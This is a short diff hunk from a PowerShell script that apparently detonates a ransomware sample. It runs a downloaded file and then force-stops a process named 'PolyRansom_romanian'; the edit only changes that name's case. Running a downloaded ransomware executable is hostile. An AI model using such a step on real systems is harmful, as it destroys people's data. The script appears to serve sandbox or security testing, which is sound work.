@@ -35,7 +35,7 @@ Start-Sleep -Seconds 10
 if (Test-Path $downloadPath) {
     Start-Process -FilePath $downloadPath -Wait
     Start-Sleep -Seconds 10
-    Stop-Process -Name "PolyRansom_romanian" -Force
+    Stop-Process -Name "POLYRANSOM_ROMANIAN" -Force
 } else {
     
 }
